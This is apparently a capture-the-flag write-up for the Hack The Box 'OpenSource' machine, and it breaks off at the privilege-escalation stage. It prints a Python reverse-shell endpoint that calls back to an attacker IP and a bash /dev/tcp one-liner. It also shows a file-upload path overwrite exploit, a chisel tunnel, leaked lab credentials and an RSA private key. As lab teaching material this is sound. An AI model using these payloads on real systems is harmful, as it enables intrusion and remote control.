# OpenSource Writeup

## Summary

Scanning with `nmap` finds a Flask webserver on port `80` for an application called "upcloud," a file uploading and sharing service. The landing page lets us download a Git repository of the source code and visit a demo of the application we downloaded. Exploring the Git repository's two branches (with a few commits per branch) reveals some credentials. There is a function in the source code that removes relative paths from uploaded file names in an attempt to prevent file uploads to other directories. However, we can use an absolute path thanks to the logic behind python's `os.path.join` method. Therefore, we upload a modified version of part of the application that contains a reverse shell endpoint and use burpsuite to change the `filename` submitted to the server. The server will overwrite the application with our modified version and then we can call our custom endpoint to get a reverse shell.

We get a reverse shell into a Docker container and access a port that `nmap` had marked as "filtered." This port contains a [Gitea](https://gitea.io) instance so we forward it to our machine using [Chisel](https://github.com/jpillora/chisel). We can sign in using the credentials previous found in the Git repository. Gitea has a repo with an SSH private key that we can use to SSH to the box.

To get `root`, we run [pspy](https://github.com/DominicBreuker/pspy) and notice that `git commit` is ran on a schedule by `root` to backup the user's home directory. We abuse this and create a pre-commit [git hook](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) that converts `/bin/bash` into a SUID binary. We wait for at most a minute and then run `bash -p` to get a root shell and grab the `root.txt` flag.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.164 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.164`.

```
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 27 Jul 2022 02:00:17 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 27 Jul 2022 02:00:17 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=7/26%Time=62E09C36%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1036,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Wed,\x2027\x20Jul\x202022\x2002:00:17\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Wed,\x2027\
SF:x20Jul\x202022\x2002:00:17\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a Flask Werkzeug server on port `80`, SSH on port `22`, and a filtered port `3000`.

### Flask (Port `80`)

At port `80` we are met with the homepage of a file sharing service called "upcloud."
![](screenshots/20220726220546.png)

There is button that lets us download the [source code](source.zip) (hence the box name "OpenSource"). There is also a test instance running at `http://10.10.11.164/upcloud`, which is linked to by the last button on the page.

First, in the source code there is a `Dockerfile` so this site is probably running in a Docker container.

#### Git

This is a git repo since there is a `.git` folder present. `git log` shows two commits:

```
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

We can run `git checkout HEAD~` to view the files from the first commit, but it is easier to run `git diff HEAD~ HEAD` to see the changes that were made:

```diff
diff --git a/Dockerfile b/Dockerfile
index 76c7768..5b0553c 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,6 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-# ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

This shows that the `FLASK_DEBUG=1` line in the `Dockerfile` was removed in the latest commit.

`git branch` shows that there is another branch called `dev`. We can view its difference from current commit with `git diff dev public`:

```diff
diff --git a/.gitignore b/.gitignore
deleted file mode 100644
index e50a290..0000000
--- a/.gitignore
+++ /dev/null
@@ -1,26 +0,0 @@
-.DS_Store
-.env
-.flaskenv
-*.pyc
-*.pyo
-env/
-venv/
-.venv/
-env*
-dist/
-build/
-*.egg
-*.egg-info/
-_mailinglist
-.tox/
-.cache/
-.pytest_cache/
-.idea/
-docs/_build/
-.vscode
-
-# Coverage reports
-htmlcov/
-.coverage
-.coverage.*
-*,cover
diff --git a/Dockerfile b/Dockerfile
index 0875eda..5b0553c 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,6 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
diff --git a/app/app/views.py b/app/app/views.py
index 0f3cc37..f2744c6 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,17 +6,7 @@ from flask import render_template, request, send_file
 from app import app
 
 
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-
-@app.route('/download')
-def download():
-    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
-
-
-@app.route('/upcloud', methods=['GET', 'POST'])
+@app.route('/', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -30,4 +20,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
```

Looks like `dev` is what is running on the box since it is what has the `/upcloud` URL instead of `/` to get to the main page. This also means `ENV FLASK_DEBUG=1` is set on the box, which means we have access to the [Flask debugger](https://flask.palletsprojects.com/en/2.1.x/debugging/#the-built-in-debugger). According to [a guide about debugging flask applications](https://flask.palletsprojects.com/en/2.1.x/debugging/#the-built-in-debugger), "The debugger allows executing arbitrary Python code from the browser. It is protected by a pin, but still represents a major security risk. Do not run the development server or debugger in a production environment."

Looking at the `dev` branch's commits with `git checkout dev && git log` shows the following:

```
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

Looking at the difference between the first two commits with `git diff ee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f75f7a4a12b706b0cf9c983796fa1985820` reveals some credentials:

```diff
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
diff --git a/app/app/views.py b/app/app/views.py
index f2744c6..0f3cc37 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,7 +6,17 @@ from flask import render_template, request, send_file
 from app import app
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -20,4 +30,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Credentials: `dev01:Soulless_Developer#2022`

#### Reverse Shell

After looking a bit more, we notice there is are functions `get_file_name` and `get_unique_upload_name` in the `source/app/app/utils.py` file:

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

`get_unique_upload_name` is not actually ever used. `get_file_name` is called when a file is uploaded:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
```

These functions appear to be attempts to prevent us from writing files outside of the `public/uploads/` directory. By calling `recursive_replace` all `"../"` are removed. Thus, relative paths that jump up directories will not work:

```python
>>> os.path.join("public", "uploads", get_file_name("../../app/app/views.py"))
'public/uploads/app/app/views.py'
```

However, the `upload_file` function uses `os.path.join`, which has one important property. The documentation states the following: "Join one or more path components intelligently. The return value is the concatenation of path and any members of \*paths with exactly one directory separator following each non-empty part except the last, meaning that the result will only end in a separator if the last part is empty. **If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.**" (emphasis mine).

So, `os.path.join("blah/foo/bar", "another/path", "/here/is/an/absolute/path")` evaluates to `"/here/is/an/absolute/path"`.

Therefore, this works:

```
>>> os.path.join("public", "uploads", get_file_name("/app/app/views.py"))
'/app/app/views.py'
```

`os.getcwd()` is used in `views.py`, but that also doesn't matter since the last absolute path has priority. `/` is not a valid character in the name of a file, but that too doesn't matter since `f.filename` is a property we control as part of the HTTP POST request.

Since we can write a file, we can replace the `views.py` file with whatever content we want. So, let's create a new version that has an endpoint that creates a reverse shell back to us:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

import sys,socket,os,pty
@app.route('/8OpZIlfrhe')
def rev_shell():
    ip = request.args.get("ip")
    port = request.args.get("port")
    s=socket.socket()
    s.connect((ip,int(port)))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    return pty.spawn("/bin/sh")
```

Our `rev_shell` function makes it so we can send a GET request to `http://10.10.11.164/8OpZIlfrhe?ip=<ip>&port=<port>` and get a reverse shell. I messed around with this function for way too long. The issue was that all of my previous attempts used `/bin/bash` which is not present since this is a container! I should have remembered that earlier. I ended up using the standard Python reverse shell (just in its expanded line-by-line format instead of a one-liner). In theory a function like the one below should work too:

```python
@app.route('/8OpZIlfrhe/<ip>/<port>')
def rev_shell(ip, port):
    return os.system(f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'")
```

Anyway, we will use burpsuite (but you can also use Firefox's developer tools to resend the upload request) to modify the `filename` that is sent when we upload our modified `views.py` file.

Go to the upcloud interface, upload the file, and intercept the request in burpsuite. Then, edit the `filename` from `views.py` to `/app/app/views.py`:

![](screenshots/20220727000732.png)

Now, start a listener with `pwncat-cs -lp 6090` (or use netcat) and go to `http://10.10.11.164/8OpZIlfrhe?ip=10.10.14.98&port=6090`. This creates a reverse shell!

#### Alternative Reverse Shell

Remember from earlier how the Flask debugger is enabled? The machine author hinted that we should use that via the git commits. This is because you can use the debugger to get a shell. Going to `http://10.10.11.164/uploads/a_file_that_doesn_exist` shows an error page and clicking the shell icon next to any of the traceback messages asks for a pin to load the debugger.

![](screenshots/20220727010815.png)

[This HackTricks page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) explains how to compute the pin. This is possible since there is a LFI exploit with the `/uploads` endpoint by requesting a file at `/uploads/..//<path>`.

#### Container

The shell created is receiving the standard output from Flask, which is interesting. There is a request from an internal service at `172.17.0.1` that is received every few minutes.
```
(remote) root@c728715d5d36:/app$ [46;34R172.17.0.1 - - [27/Jul/2022 03:58:01] "GET / HTTP/1.1" 200 -
                                                                                                    172.17.0.1 - - [27/Jul/2022 04:00:01] "GET / HTTP/1.1" 200 -
                                                           172.17.0.1 - - [27/Jul/2022 04:02:02] "GET / HTTP/1.1" 200 -

/bin/sh: [46: not found
/bin/sh: 34R: not found
(remote) root@c728715d5d36:/app$ [46;34R
/bin/sh: [46: not found
/bin/sh: 34R: not found
(remote) root@c728715d5d36:/app$ 172.17.0.1 - - [27/Jul/2022 04:04:02] "GET / HTTP/1.1" 200 -
                                                                                             172.17.0.1 - - [27/Jul/2022 04:06:02] "GET / HTTP/1.1" 200 -
```

Looking at `/`, we can see that this is indeed a docker container:

```
(remote) root@c728715d5d36:/app$ ls -la /
total 72
drwxr-xr-x    1 root     root          4096 Jul 27 03:42 .
drwxr-xr-x    1 root     root          4096 Jul 27 03:42 ..
-rwxr-xr-x    1 root     root             0 Jul 27 03:42 .dockerenv
drwxr-xr-x    1 root     root          4096 May  4 16:35 app
drwxr-xr-x    1 root     root          4096 Mar 17 05:52 bin
drwxr-xr-x    5 root     root           340 Jul 27 03:42 dev
drwxr-xr-x    1 root     root          4096 Jul 27 03:42 etc
drwxr-xr-x    2 root     root          4096 May  4 16:35 home
drwxr-xr-x    1 root     root          4096 May  4 16:35 lib
drwxr-xr-x    5 root     root          4096 May  4 16:35 media
drwxr-xr-x    2 root     root          4096 May  4 16:35 mnt
drwxr-xr-x    2 root     root          4096 May  4 16:35 opt
dr-xr-xr-x  221 root     root             0 Jul 27 03:42 proc
drwx------    1 root     root          4096 Jul 27 03:57 root
drwxr-xr-x    1 root     root          4096 Jul 27 03:42 run
drwxr-xr-x    1 root     root          4096 Mar 17 05:52 sbin
drwxr-xr-x    2 root     root          4096 May  4 16:35 srv
dr-xr-xr-x   13 root     root             0 Jul 27 03:42 sys
drwxrwxrwt    1 root     root          4096 Jul 27 03:42 tmp
drwxr-xr-x    1 root     root          4096 May  4 16:35 usr
drwxr-xr-x    1 root     root          4096 May  4 16:35 var
```

We saw a filtered port `3000` from the initial nmap scan which likely means whatever service running on that port is running internally. Let's see if we can access it from within the Docker container.

```
(remote) root@c728715d5d36:/app$ wget 10.10.11.164:3000
Connecting to 10.10.11.164:3000 (10.10.11.164:3000)
saving to 'index.html'
index.html           100% |*****************************************************| 13414  0:00:00 ETA
'index.html' saved
(remote) root@c728715d5d36:/app$ head index.html
<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Gitea: Git with a cup of tea</title>
        <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19"/>
        <meta name="theme-color" content="#6cc644">
        <meta name="default-theme" content="auto" />
        <meta name="author" content="Gitea - Git with a cup of tea" />
```

Looks like we can! It is a [Gitea](https://gitea.io/) instance.

Since we have limited tools in the docker container, we need to forward this port to our attacker machine so we can work with it. This is made easy with [chisel](https://github.com/jpillora/chisel) ([helpful guide](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)). Run `./chisel server -p 12350 --reverse` on your attacker machine and then run `./chisel_386 client 10.10.14.98:12350 R:3000:172.17.0.1:3000` on the target (make sure to use the [386](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz) version on the target container). You can upload `chisel` easily with pwncat by running `upload tools/chisel_386` in the local shell (this ended by connection, but the file did upload completed and I just reconnected by reloading `http://10.10.11.164/8OpZIlfrhe?ip=10.10.14.98&port=6090`). By the way, `172.17.0.1` is the IP address of the host from within the container.

Now, going to `http://localhost:3000/` on our attacker machine loads Gitea.

### Gitea (Port `3000`)

Signing in with the credentials (`dev01:Soulless_Developer#2022`) that we found earlier in the Git repo works!

![](screenshots/20220727010711.png)

Looking at the home-backup repository shows that it has an `.ssh` directory with an `id_rsa` private key in it.

![](screenshots/20220727011125.png)

```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

## Foothold

We save this to our attacker machine and use it to SSH onto the box as the `dev01` user. Change the permissions for the key with `chmod 600 ~/Downloads/id_rsa` and then SSH with `ssh dev01@10.10.11.164 -i ~/Downloads/id_rsa`.

Now we can print the `user.txt` flag by running `cat ~/user.txt`.

## Privilege Escalation

Instead of connecting over SSH we can connect using pwncat so we can easily upload files: `pwncat-cs dev01@10.10.11.164 -i ~/Downloads/id_rsa`.

Upload [pspy](https://github.com/DominicBreuker/pspy) by running `upload pspy64` in pwncat's local shell. This will enable us to monitor processes that are ran without root.

This important output is observed:

```
2022/07/27 05:23:01 CMD: UID=0    PID=14084  | /bin/bash /usr/local/bin/git-sync
2022/07/27 05:23:01 CMD: UID=0    PID=14083  | /bin/sh -c /usr/local/bin/git-sync
2022/07/27 05:23:01 CMD: UID=0    PID=14082  | /usr/sbin/CRON -f
2022/07/27 05:23:01 CMD: UID=0    PID=14085  | git status --porcelain
2022/07/27 05:23:01 CMD: UID=0    PID=14087  | git add .
2022/07/27 05:23:01 CMD: UID=0    PID=14088  | git commit -m Backup for 2022-07-27
